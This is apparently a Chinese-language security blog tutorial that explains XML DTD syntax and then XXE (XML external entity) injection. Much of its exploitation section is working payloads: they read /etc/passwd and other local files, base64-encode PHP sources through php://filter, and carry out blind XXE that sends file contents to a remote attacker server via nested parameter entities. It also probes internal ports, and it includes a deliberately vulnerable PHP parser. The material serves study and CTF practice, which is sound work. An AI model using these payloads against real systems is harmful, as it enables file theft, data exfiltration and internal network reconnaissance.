<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">note</span> [<span class="meta">&lt;!ELEMENT <span class="meta-keyword">note</span> (<span class="meta-keyword">to</span>,<span class="meta-keyword">from</span>,<span class="meta-keyword">heading</span>,<span class="meta-keyword">body</span>)&gt;</span><span class="meta">&lt;!ELEMENT <span class="meta-keyword">to</span> (<span class="meta-keyword">#PCDATA</span>)&gt;</span><span class="meta">&lt;!ELEMENT <span class="meta-keyword">from</span> (<span class="meta-keyword">#PCDATA</span>)&gt;</span><span class="meta">&lt;!ELEMENT <span class="meta-keyword">heading</span> (<span class="meta-keyword">#PCDATA</span>)&gt;</span><span class="meta">&lt;!ELEMENT <span class="meta-keyword">body</span> (<span class="meta-keyword">#PCDATA</span>)&gt;</span>]&gt;</span></span><br></pre></td></tr></table></figure>

<p>注：W3C 支持一种基于 XML 的 DTD 代替者，它名为 XML Schema</p>
<p><a target="_blank" rel="noopener" href="https://www.runoob.com/schema/schema-tutorial.html">XML Schema 菜鸟教程</a></p>
<p><a target="_blank" rel="noopener" href="https://www.freebuf.com/column/156863.html">使用 XML Schema 攻击</a></p>
<p><strong>定义实体：</strong></p>
<p>除了在 DTD 中定义 <strong>元素</strong>（其实就是对应 XML 中的标签）以外，我们还能在 DTD 中 <strong>定义实体</strong> (对应XML 标签中的内容)</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version=<span class="string">&quot;1.0&quot;</span> encoding=<span class="string">&quot;utf-8&quot;</span>?&gt;&lt;!DOCTYPE foo [&lt;!ELEMENT foo ANY &gt;&lt;!ENTITY xxe <span class="string">&quot;test&quot;</span>&gt;]&gt;&lt;creds&gt;    &lt;user&gt;&amp;xxe;&lt;/user&gt;    &lt;pass&gt;mypass&lt;/pass&gt;&lt;/creds&gt;</span><br></pre></td></tr></table></figure>

<p>实体可以从 <strong>外部的 dtd 文件</strong> 中引用</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version=<span class="string">&quot;1.0&quot;</span> encoding=<span class="string">&quot;utf-8&quot;</span>?&gt;&lt;!DOCTYPE foo [&lt;!ELEMENT foo ANY &gt;&lt;!ENTITY xxe SYSTEM <span class="string">&quot;file:///c:/test.dtd&quot;</span> &gt;]&gt;&lt;creds&gt;    &lt;user&gt;&amp;xxe;&lt;/user&gt;    &lt;pass&gt;mypass&lt;/pass&gt;&lt;/creds&gt;dtd:&lt;!ENTITY xxe SYSTEM <span class="string">&quot;file:///d://test1.txt&quot;</span>&gt; </span><br></pre></td></tr></table></figure>

<p><strong>声明方式</strong></p>
<ul>
<li><p>内部声明</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;!DOCTYPE 根元素 [元素声明]&gt;#例如&lt;!DOCTYPE message [&lt;!ELEMENT message (hair,country,eye,body)&gt;&lt;!ELEMENT hair (#PCDATA)&gt;&lt;!ELEMENT country (#PCDATA)&gt;&lt;!ELEMENT eye (#PCDATA)&gt; &lt;!ELEMENT body (#PCDATA)&gt; ]&gt;</span><br></pre></td></tr></table></figure>

<p><img src="https://i.loli.net/2021/10/01/XEiQ1UWsDwMqoKk.png" alt="image-20210427173839979"></p>
</li>
<li><p>外部声明</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;!DOCTYPE 根元素 SYSTEM &quot;文件名&quot;&gt;</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">#例如：&lt;!DOCTYPE message SYSTEM &quot;message.dtd&quot;&gt;#message.dtd&lt;!ELEMENT message (hair,country,eye,body)&gt;&lt;!ELEMENT hair (#PCDATA)&gt;&lt;!ELEMENT country (#PCDATA)&gt;&lt;!ELEMENT eye (#PCDATA)&gt; &lt;!ELEMENT body (#PCDATA)&gt; </span><br></pre></td></tr></table></figure>

<p><img src="https://i.loli.net/2021/10/01/1MXarQISDvh8kjC.png" alt="image-20210427173804619"></p>
</li>
</ul>
<h1 id="二、DTD"><a href="#二、DTD" class="headerlink" title="二、DTD"></a>二、DTD</h1><h2 id="2-1-元素声明"><a href="#2-1-元素声明" class="headerlink" title="2.1 元素声明"></a>2.1 元素声明</h2><ul>
<li><p>普通声明</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;!ELEMENT element-name category&gt;或&lt;!ELEMENT element-name (element-content)&gt; </span><br></pre></td></tr></table></figure></li>
<li><p>空元素</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;!ELEMENT element-name EMPTY&gt;实例:&lt;!ELEMENT br EMPTY&gt;XML example:&lt;br /&gt; </span><br></pre></td></tr></table></figure></li>
<li><p>PCDATA元素</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;!ELEMENT element-name (#PCDATA)&gt;</span><br></pre></td></tr></table></figure></li>
<li><p>带有任何内容的元素</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;!ELEMENT element-name ANY&gt;</span><br></pre></td></tr></table></figure></li>
<li><p>带有子元素的声明</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;!ELEMENT element-name (child1)&gt;&lt;!ELEMENT element-name (child1,child2,...)&gt;</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">例子：要按顺序&lt;!ELEMENT note (to,from,heading,body)&gt;&lt;!ELEMENT to (#PCDATA)&gt;&lt;!ELEMENT from (#PCDATA)&gt;&lt;!ELEMENT heading (#PCDATA)&gt;&lt;!ELEMENT body (#PCDATA)&gt; </span><br></pre></td></tr></table></figure></li>
<li><p>只出现一次的元素</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;!ELEMENT element-name (child-name)&gt;</span><br></pre></td></tr></table></figure></li>
<li><p>最少出现一次的元素</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;!ELEMENT element-name (child-name+)&gt;</span><br></pre></td></tr></table></figure></li>
<li><p>出现零次或多次</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;!ELEMENT element-name (child-name*)&gt;</span><br></pre></td></tr></table></figure></li>
<li><p>出现零次或一次</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;!ELEMENT element-name (child-name?)&gt;</span><br></pre></td></tr></table></figure></li>
<li><p>其它</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;!ELEMENT note (to,from,header,(message|body))&gt; &lt;!ELEMENT note (#PCDATA|to|from|header|message)*&gt; </span><br></pre></td></tr></table></figure></li>
</ul>
<h2 id="2-2-属性声明"><a href="#2-2-属性声明" class="headerlink" title="2.2 属性声明"></a>2.2 属性声明</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;!ATTLIST element-name attribute-name attribute-type attribute-value&gt;</span><br></pre></td></tr></table></figure>

<p><a target="_blank" rel="noopener" href="https://www.runoob.com/dtd/dtd-attributes.html">属性类型</a></p>
<h2 id="2-3-实体"><a href="#2-3-实体" class="headerlink" title="2.3 实体"></a>2.3 实体</h2><p>前面了解到DTD是用来定义XML文档当中的元素的，用于规范他们，实际上，它还  用于定义引用普通文本或特殊字符的快捷方式的变量（即 实体）。</p>
<p>实体其实可以看成一个变量，到时候我们可以在 XML 中通过 &amp; 符号进行引用。</p>
<h3 id="2-3-1-普通实体"><a href="#2-3-1-普通实体" class="headerlink" title="2.3.1 普通实体"></a>2.3.1 普通实体</h3><ul>
<li><p>内部声明</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;!ENTITY entity-name &quot;entity-value&quot;&gt; </span><br></pre></td></tr></table></figure>

<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#实体的引用：&amp;，实体名称，分号</span></span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">例子：&lt;!ENTITY day &quot;10&quot;&gt; XML:&lt;day&gt;&amp;day;&lt;/day&gt;</span><br></pre></td></tr></table></figure></li>
<li><p>外部声明</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;!ENTITY 实体名称 SYSTEM &quot;URI/URL&quot;&gt;&lt;!ENTITY 实体名称 PUBLIC &quot;DTD标识名&quot; &quot;公用DTD的URI&quot;区别:    PUBLIC是指公用DTD,其是某个权威机构制定，供特定行业或公司.    SYSTEM是指该外部DTD文件是私有的，即我们自己创建的，没有公开发行，只是个人或在公司内部或者几个合作单位之间使用.    公用DTD使用PUBLIC代替了原来的SYSTEM，并增加了DTD标识名。</span><br></pre></td></tr></table></figure>

<p><img src="https://i.loli.net/2021/10/01/cAwrFKT9kLe1oqR.png" alt="image-20210428192136904"></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">例子：test1.dtd:&lt;!ENTITY test SYSTEM &quot;file:///d://test1.txt&quot;&gt;XML：&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt;&lt;!DOCTYPE test SYSTEM &quot;file:///d://test1.dtd&quot;&gt;&lt;author&gt;&amp;test;&lt;/author&gt; </span><br></pre></td></tr></table></figure></li>
</ul>
<h3 id="2-3-2-参数实体"><a href="#2-3-2-参数实体" class="headerlink" title="2.3.2 参数实体"></a>2.3.2 参数实体</h3><p>仅仅在DTD中使用的解析实体</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#内部声明: ENTITY关键字、百分号、名称和替换值&lt;!ENTITY % 实体名称 &quot;实体值&quot;&gt;#外部声明&lt;!ENTITY % 实体名称 SYSTEM &quot;URI&quot;&gt;%实体名;#实体的引用&lt;x&gt;%实体名;&lt;/x&gt;</span></span><br></pre></td></tr></table></figure>

<p>注：</p>
<ol>
<li><p>%两边的空格不能少</p>
</li>
<li><p>参数实体不能像普通实体那样在xml文档内容中进行引用，它的引用范围只在 <strong>当前xml文件的DTD声明</strong> 中，或者是 <strong>当前的DTD文件</strong> 中</p>
</li>
<li><p>在DTD中，所有参数实体必须在引用之前进行声明</p>
</li>
<li><p>参数实体对 无回显XXE 的利用 起了至关重要的作用</p>
</li>
</ol>
<p><a target="_blank" rel="noopener" href="https://www.runoob.com/schema/schema-tutorial.html">XML Schema 菜鸟教程</a></p>
<h1 id="三、XXE"><a href="#三、XXE" class="headerlink" title="三、XXE"></a>三、XXE</h1><p>**XML External Entity —  XML外部实体注入漏洞 ** , 发生在 <code>应用程序解析XML输入</code>时，没有禁止外部实体的加载 （ <code>与该选项有关libxml_disable_entity_loader (false);</code>），导致可加载恶意外部文件和代码，造成任意文件读取、命令执行、内网端口扫描、攻击内网网站、发起Dos攻击 等危害。</p>
<p><strong>概述</strong>：攻击者通过 <strong>向服务器注入指定的xml实体内容</strong> ，从而让服务器按照指定的配置进行执行,导致问题。也就是说服务端 <strong>接收和解析</strong> 了来自用户端的xml数据,而又没有做严格的安全控制,从而导致 xml外部实体注入。</p>
<p><strong>产生点：</strong></p>
<ul>
<li>文档类型定义时，可以引用外部的 DTD 文件</li>
<li>XML解析器解析外部实体时支持多种协议（file :///, http:// 等）</li>
</ul>
<p><strong>利用点：</strong></p>
<p>​    通过构造恶意的外部实体，当XML解析器解析了我们所包含的恶意实体时便会触发漏洞  </p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">现在很多语言里面对应的解析xml的函数默认是禁止解析外部实体内容的,从而也就直接避免了这个漏洞。<span class="comment">#以PHP为例,在PHP里面解析xml用的是libxml，其在≥2.9.0的版本中,默认是禁止解析xml外部实体内容的。</span></span><br></pre></td></tr></table></figure>

<p><strong>危害</strong></p>
<ul>
<li>文件读取</li>
<li>RCE执行</li>
<li>内网攻击</li>
<li>Dos攻击</li>
</ul>
<h2 id="3-1-利用"><a href="#3-1-利用" class="headerlink" title="3.1 利用"></a>3.1 利用</h2><h3 id="3-1-1-有回显"><a href="#3-1-1-有回显" class="headerlink" title="3.1.1 有回显"></a>3.1.1 有回显</h3><p><strong>通过正常的回显将 外部实体 中的内容读取出来</strong></p>
<h4 id="测试："><a href="#测试：" class="headerlink" title="测试："></a>测试：</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span>        libxml_disable_entity_loader (<span class="literal">false</span>);<span class="comment">//禁用加载外部实体的功能，禁用（TRUE）或启用（FALSE）libxml扩展（如DOM，XMLWriter和XMLReader）来加载外部实体    $xmlfile = file_get_contents(&#x27;php://input&#x27;);    $dom = new DOMDocument();//创建一个DOM对象    $dom-&gt;loadXML($xmlfile, LIBXML_NOENT | LIBXML_DTDLOAD); //加载XML//LIBXML_NOENT 	 替代实体//LIBXML_DTDLOAD 加载外部子集    $creds = simplexml_import_dom($dom);//该函数把 DOM 节点转换为 SimpleXMLElement 对象    echo $creds;<span class="meta">?&gt;</span></span></span><br></pre></td></tr></table></figure>

<p><strong>引入内部实体</strong></p>
<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt;</span> <span class="meta">&lt;!DOCTYPE <span class="meta-keyword">xxe</span> [  <span class="meta">&lt;!ENTITY <span class="meta-keyword">test</span> <span class="meta-keyword">SYSTEM</span> <span class="meta-string">&quot;file:///c:/windows/system32/drivers/etc/hosts&quot;</span>&gt;</span> ]&gt;</span> <span class="tag">&lt;<span class="name">creds</span>&gt;</span><span class="symbol">&amp;test;</span><span class="tag">&lt;/<span class="name">creds</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p><img src="https://i.loli.net/2021/10/01/BPJbaF2HVAKTXjg.png" alt="image-20210427191038850"></p>
<hr>
<hr>
<p><strong>引入外部参数实体 —– 题目当中经常使用的一个点</strong></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot; ?&gt;&lt;!DOCTYPE test [    &lt;!ENTITY % file SYSTEM &quot;http://vps-ip/hack.dtd&quot;&gt;    %file;]&gt;&lt;test&gt;&amp;hhh;&lt;/test&gt;</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hack.dtd&lt;!ENTITY hhh SYSTEM &#x27;file:///etc/passwd&#x27;&gt;</span><br></pre></td></tr></table></figure>

<hr>
<hr>
<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt;</span> <span class="meta">&lt;!DOCTYPE <span class="meta-keyword">xxe</span> [  <span class="meta">&lt;!ENTITY <span class="meta-keyword">test</span> <span class="meta-keyword">SYSTEM</span> <span class="meta-string">&quot;file:///d://222.txt&quot;</span>&gt;</span> ]&gt;</span> <span class="tag">&lt;<span class="name">creds</span>&gt;</span><span class="symbol">&amp;test;</span><span class="tag">&lt;/<span class="name">creds</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>当文件内容当中包含 <code>&lt; 和 &amp;</code> 符号时，就会出现报错</p>
<p>php://filter之前最常出镜的地方是XXE。由于XXE漏洞的特殊性，我们在读取HTML、PHP等文件时可能会抛出此类错误<code>parser error : StartTag: invalid element name</code> 。其原因是，PHP是基于标签的脚本语言，<code>&lt;?php ... ?&gt;</code>这个语法也与XML相符合，所以在解析XML的时候会被误认为是XML，而其中内容（比如特殊字符）又有可能和标准XML冲突，所以导致了出错。</p>
<p><img src="https://i.loli.net/2021/10/01/ZvIz6LwdcMQANU9.png" alt="image-20210427191730235"></p>
<p>解决：使用 <code>CDATA</code></p>
<p>想法一：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version=<span class="string">&quot;1.0&quot;</span> encoding=<span class="string">&quot;utf-8&quot;</span>?&gt; &lt;!DOCTYPE xxe [  &lt;!ENTITY <span class="built_in">test</span> SYSTEM <span class="string">&quot;file:///d:/222.txt&quot;</span>&gt; ]&gt; &lt;creds&gt;&lt;![CDATA[&amp;<span class="built_in">test</span>;]]&gt;&lt;/creds&gt;<span class="comment">#错误：这只会将 &amp;test; 原模原样的输出</span></span><br></pre></td></tr></table></figure>

<p>想法二：直接在 xml当中进行拼接 —- 普通实体</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version=<span class="string">&quot;1.0&quot;</span> encoding=<span class="string">&quot;utf-8&quot;</span>?&gt; &lt;!DOCTYPE xxe [  &lt;!ENTITY start <span class="string">&quot;&lt;![CDATA[&quot;</span>&gt;&lt;!ENTITY <span class="built_in">test</span> SYSTEM <span class="string">&quot;file:///d:/222.txt&quot;</span>&gt; &lt;!ENTITY end <span class="string">&quot;]]&gt;&quot;</span>&gt;]&gt; &lt;creds&gt;&amp;start;&amp;<span class="built_in">test</span>;&amp;end;&lt;/creds&gt;<span class="comment">#依旧是大量的报错</span></span><br></pre></td></tr></table></figure>

<p>想法三：参数实体 在 内部DTD拼接</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version=<span class="string">&quot;1.0&quot;</span> encoding=<span class="string">&quot;utf-8&quot;</span>?&gt; &lt;!DOCTYPE xxe [  &lt;!ENTITY % start <span class="string">&quot;&lt;![CDATA[&quot;</span>&gt;&lt;!ENTITY % <span class="built_in">test</span> SYSTEM <span class="string">&quot;file:///d:/222.txt&quot;</span>&gt; &lt;!ENTITY % end  <span class="string">&quot;]]&gt;&quot;</span>&gt;&lt;!ENTITY all <span class="string">&quot;%start;%test;%end;&quot;</span>&gt;]&gt; &lt;creds&gt;&amp;all;&lt;/creds&gt;<span class="comment">#仍旧有报错</span></span><br></pre></td></tr></table></figure>

<p>根据XML规范所描述：“在DTD内部子集中的参数实体调用，不能混掺到标记语中” ;</p>
<p>也就是说参数实体不能在内部DTD中进行拼接，但是XML规范还声明了一点：“外部参数实体不受此限制”，这就告诉我们可以使用外部的DTD来构造payload，将我们的CDATA内容拼接起来.</p>
<p>想法四：使用外部参数实体</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version=<span class="string">&quot;1.0&quot;</span> encoding=<span class="string">&quot;utf-8&quot;</span>?&gt; &lt;!DOCTYPE xxe [  &lt;!ENTITY % start <span class="string">&quot;&lt;![CDATA[&quot;</span>&gt;&lt;!ENTITY % <span class="built_in">test</span> SYSTEM <span class="string">&quot;file:///d:/222.txt&quot;</span>&gt; &lt;!ENTITY % end <span class="string">&quot;]]&gt;&quot;</span>&gt;&lt;!ENTITY % dtd SYSTEM <span class="string">&quot;file:///d:/xxe.dtd&quot;</span>&gt;%dtd; ]&gt;&lt;creds&gt;&amp;all;&lt;/creds&gt;xxe.dtd:&lt;?xml version=<span class="string">&quot;1.0&quot;</span> encoding=<span class="string">&quot;UTF-8&quot;</span>?&gt; &lt;!ENTITY all <span class="string">&quot;%start;%test;%end;&quot;</span>&gt;</span><br></pre></td></tr></table></figure>

<p>可成功显示出 &amp; &lt; 符号</p>
<h4 id="php伪协议"><a href="#php伪协议" class="headerlink" title="php伪协议"></a>php伪协议</h4><p>那么，为了读取包含有敏感信息的PHP等源文件，我们就要先将“可能引发冲突的PHP代码”编码一遍，这里就会用到php://filter。</p>
<p>php://filter是PHP语言中特有的协议流</p>
<p><a target="_blank" rel="noopener" href="https://www.leavesongs.com/PENETRATION/php-filter-magic.html?page=2#reply-list">https://www.leavesongs.com/PENETRATION/php-filter-magic.html?page=2#reply-list</a></p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version=<span class="string">&quot;1.0&quot;</span> encoding=<span class="string">&quot;utf-8&quot;</span>?&gt; &lt;!DOCTYPE xxe [  &lt;!ENTITY <span class="built_in">test</span> SYSTEM <span class="string">&quot;php://filter/read=convert.base64-encode/resource=d:/222.txt&quot;</span>&gt; ]&gt;&lt;creds&gt;&amp;<span class="built_in">test</span>;&lt;/creds&gt;</span><br></pre></td></tr></table></figure>

<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?</span>xml version=<span class="string">&quot;1.0&quot;</span> encoding=<span class="string">&quot;utf-8&quot;</span><span class="meta">?&gt;</span> &lt;!DOCTYPE xxe [  &lt;!ENTITY test SYSTEM <span class="string">&quot;data://text/plain;base64,&quot;</span>&gt; ]&gt;&lt;creds&gt;&amp;test;&lt;/creds&gt;</span><br></pre></td></tr></table></figure>

<p><img src="https://i.loli.net/2021/10/01/O7yTFhPHXEMZ5KD.png" alt="image-20210430094755236"></p>
<p><img src="https://i.loli.net/2021/10/01/lnXdb7kDyQFq5K6.png" alt="image-20210430094745930"></p>
<h3 id="3-1-2-无回显"><a href="#3-1-2-无回显" class="headerlink" title="3.1.2 无回显"></a>3.1.2 无回显</h3><p><strong>利用参数实体将本地文件内容读出来后，作为URL中的参数向其指定的服务器发起请求，然后在其指定服务器的日志中读出文件内容</strong></p>
<h4 id="测试"><a href="#测试" class="headerlink" title="测试"></a>测试</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span>libxml_disable_entity_loader (<span class="literal">false</span>);<span class="variable">$xmlfile</span> = file_get_contents(<span class="string">&#x27;php://input&#x27;</span>);<span class="variable">$dom</span> = <span class="keyword">new</span> DOMDocument();<span class="variable">$dom</span>-&gt;loadXML(<span class="variable">$xmlfile</span>, LIBXML_NOENT | LIBXML_DTDLOAD); <span class="comment">//未输出<span class="meta">?&gt;</span></span></span><br></pre></td></tr></table></figure>

<p>Payload:</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot;?&gt;&lt;!DOCTYPE convert [ &lt;!ENTITY % test SYSTEM &quot;http://xxe/xxe2.dtd&quot;&gt;%test;%int;%send;]&gt;</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">xxe2.dtd:&lt;!ENTITY % file SYSTEM &quot;php://filter/read=convert.base64-encode/resource=file:///d:/222.txt&quot;&gt;&lt;!ENTITY % int &quot;&lt;!ENTITY &amp;#37; send SYSTEM &#x27;http://xxe:9999?p=%file;&#x27;&gt;&quot;&gt;</span><br></pre></td></tr></table></figure>

<p>日志的读取/文件的接收代码 或者是 开启端口监听</p>
<p>开启端口监听</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python2语法：python -m SimpleHTTPServer portpython3语法：python -m http.server port</span><br></pre></td></tr></table></figure>

<p><img src="https://i.loli.net/2021/10/01/7h6VMgZPfzImFHe.png" alt="image-20210430092340860"></p>
<p>说明：</p>
<blockquote>
<p>我们总共连续调用了三个参数实体，%test;%int;%send;</p>
<p>首先调用%test去请求远程服务器上的xxe2.dtd，相当于将xxe2.dtd包含进来，然后调用 %int，在xxe2.dtd文件当中将会调用%file，%file将会获取服务器上的敏感文件222.txt，然后将%file（敏感文件当中的内容）写入%send当中(由于实体的值中不能有 %, 所以将其转成html实体编码 <code>&amp;#37;</code>)；</p>
<p>最后调用 %send ，就会将我们读取到的数据发送到远程 vps上，也就实现了</p>
<p><strong>外带数据</strong>   的效果，解决了xxe无回显的问题。</p>
</blockquote>
<hr>
<hr>
<p><strong>引入服务器文件</strong></p>
<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=&quot;1.0&quot;?&gt;</span><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">message</span> [	<span class="meta">&lt;!ENTITY % <span class="meta-keyword">remote</span> <span class="meta-keyword">SYSTEM</span> <span class="meta-string">&quot;http://blog.szfszf.top/xml.dtd&quot;</span>&gt;</span>	<span class="meta">&lt;!ENTITY % <span class="meta-keyword">file</span> <span class="meta-keyword">SYSTEM</span> <span class="meta-string">&quot;php://filter/read=convert.base64-encode/resource=file:///flag&quot;</span>&gt;</span>	%remote;	%send;]&gt;</span><span class="tag">&lt;<span class="name">message</span>&gt;</span>1234<span class="tag">&lt;/<span class="name">message</span>&gt;</span></span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">xml.dtd:&lt;!ENTITY % start &quot;&lt;!ENTITY &amp;#x25; send SYSTEM &#x27;file:///hhhhhhh/%file;&#x27;&gt;&quot;&gt;%start;</span><br></pre></td></tr></table></figure>

<p><strong>引入本地文件</strong></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot;?&gt;&lt;!DOCTYPE message [	&lt;!ENTITY % remote SYSTEM &quot;/usr/share/yelp/dtd/docbookx.dtd&quot;&gt;	&lt;!ENTITY % file SYSTEM &quot;php://filter/read=convert.base64-encode/resource=file:///flag&quot;&gt;	&lt;!ENTITY % ISOamso &#x27;		&lt;!ENTITY &amp;#x25; eval &quot;&lt;!ENTITY &amp;#x26;#x25; send SYSTEM &amp;#x27;file://hhhhhhhh/?&amp;#x25;file;&amp;#x27;&gt;&quot;&gt;		&amp;#x25;eval;		&amp;#x25;send;	&#x27;&gt; 	%remote;]&gt;&lt;message&gt;1234&lt;/message&gt;</span><br></pre></td></tr></table></figure>

<p><strong>嵌套参数实体</strong></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot;?&gt;&lt;!DOCTYPE message [	&lt;!ENTITY % file SYSTEM &quot;file:///etc/passwd&quot;&gt;  	&lt;!ENTITY % start &quot;&lt;!ENTITY &amp;#x25; send SYSTEM &#x27;http://myip/?%file;&#x27;&gt;&quot;&gt;	%start;	%send;]&gt;&lt;message&gt;10&lt;/message&gt;</span><br></pre></td></tr></table></figure>

<p><strong>三层嵌套参数实体</strong></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot;?&gt;&lt;!DOCTYPE message [	&lt;!ELEMENT message ANY&gt;	&lt;!ENTITY % para1 SYSTEM &quot;file:///flag&quot;&gt;	&lt;!ENTITY % para &#x27;		&lt;!ENTITY &amp;#x25; para2 &quot;&lt;!ENTITY &amp;#x26;#x25; error SYSTEM &amp;#x27;file:///&amp;#x25;para1;&amp;#x27;&gt;&quot;&gt;		&amp;#x25;para2;	&#x27;&gt;	%para;]&gt;&lt;message&gt;10&lt;/message&gt;</span><br></pre></td></tr></table></figure>

<p><a href="cnblogs.com/20175211lyz/p/11413335.html">更多绕过姿势</a></p>
<hr>
<h4 id="HTTP-内网主机探测-–-端口扫描"><a href="#HTTP-内网主机探测-–-端口扫描" class="headerlink" title="HTTP 内网主机探测 – 端口扫描"></a>HTTP 内网主机探测 – 端口扫描</h4><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version=<span class="string">&quot;1.0&quot;</span> encoding=<span class="string">&quot;utf-8&quot;</span>?&gt;  &lt;!DOCTYPE data SYSTEM <span class="string">&quot;http://127.0.0.1:8080/&quot;</span> [  ]&gt;&lt;data&gt;<span class="number">4</span>&lt;/data&gt;</span><br></pre></td></tr></table></figure>

<p>可结合 burp 爆破模块</p>
